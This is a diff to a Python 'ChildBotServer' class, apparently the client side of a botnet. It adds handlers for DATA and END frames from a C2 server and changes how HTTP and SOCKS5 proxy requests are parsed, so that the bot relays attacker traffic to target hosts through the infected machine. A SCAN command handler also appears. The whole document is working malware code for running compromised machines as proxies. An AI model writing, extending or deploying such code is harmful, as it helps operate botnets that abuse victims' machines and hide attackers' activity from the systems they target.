@@ -141,6 +141,12 @@ class ChildBotServer:
                 elif data.startswith("SCAN:"):
                     self.handle_scan_command(data)
                     
+                elif data.startswith("DATA:"):
+                    self.handle_data_frame(data)
+                    
+                elif data.startswith("END:"):
+                    self.handle_end_frame(data)
+                    
                 else:
                     print(f"❓ Unknown command: {data}")
                     
@@ -175,12 +181,13 @@ class ChildBotServer:
     def handle_proxy_request(self, command):
         """Xử lý HTTP proxy request (framed protocol)"""
         try:
+            # Format: PROXY_REQUEST:IP:PORT:TIMESTAMP:TARGET_HOST:TARGET_PORT:IS_HTTPS
             parts = command.split(":")
-            if len(parts) >= 5:
-                connection_id = parts[1]
-                target_host = parts[2]
-                target_port = int(parts[3])
-                is_https = parts[4].lower() == 'true'
+            if len(parts) >= 7:
+                connection_id = f"{parts[1]}:{parts[2]}:{parts[3]}"  # IP:PORT:TIMESTAMP
+                target_host = parts[4]
+                target_port = int(parts[5])
+                is_https = parts[6].lower() == 'true'
                 
                 print(f"🌐 HTTP Proxy request: {target_host}:{target_port} ({'HTTPS' if is_https else 'HTTP'})")
                 
@@ -196,11 +203,12 @@ class ChildBotServer:
     def handle_socks_request(self, command):
         """Xử lý SOCKS5 proxy request (framed protocol)"""
         try:
+            # Format: SOCKS_REQUEST:IP:PORT:TIMESTAMP:TARGET_HOST:TARGET_PORT
             parts = command.split(":")
-            if len(parts) >= 4:
-                connection_id = parts[1]
-                target_host = parts[2]
-                target_port = int(parts[3])
+            if len(parts) >= 6:
+                connection_id = f"{parts[1]}:{parts[2]}:{parts[3]}"  # IP:PORT:TIMESTAMP
+                target_host = parts[4]
+                target_port = int(parts[5])
                 
                 print(f"🧦 SOCKS5 Proxy request: {target_host}:{target_port}")
                 
@@ -442,6 +450,44 @@ class ChildBotServer:
                 
         self.connected_to_c2 = False
         print("✅ Cleanup completed")
+        
+    def handle_data_frame(self, command):
+        """Xử lý DATA frame từ C2"""
+        try:
+            # Format: DATA:IP:PORT:TIMESTAMP:DATA
+            parts = command.split(":", 4)
+            if len(parts) >= 5:
+                connection_id = f"{parts[1]}:{parts[2]}:{parts[3]}"  # IP:PORT:TIMESTAMP
+                data = parts[4]
+                
+                if connection_id in self.active_connections:
+                    # Forward data to target
+                    target_socket = self.active_connections[connection_id]['target_socket']
+                    target_socket.send(data.encode())
+                    self.active_connections[connection_id]['bytes_transferred'] += len(data)
+                    print(f"📤 Forwarded {len(data)} bytes to target")
+                else:
+                    print(f"⚠️  Connection {connection_id} not found for data forwarding")
+                    
+        except Exception as e:
+            print(f"❌ Error handling data frame: {e}")
+            
+    def handle_end_frame(self, command):
+        """Xử lý END frame từ C2"""
+        try:
+            # Format: END:IP:PORT:TIMESTAMP
+            parts = command.split(":")
+            if len(parts) >= 4:
+                connection_id = f"{parts[1]}:{parts[2]}:{parts[3]}"  # IP:PORT:TIMESTAMP
+                
+                if connection_id in self.active_connections:
+                    print(f"🔚 Closing connection {connection_id}")
+                    self.close_connection(connection_id)
+                else:
+                    print(f"⚠️  Connection {connection_id} not found for closing")
+                    
+        except Exception as e:
+            print(f"❌ Error handling end frame: {e}")
 
 def main():
     import argparse
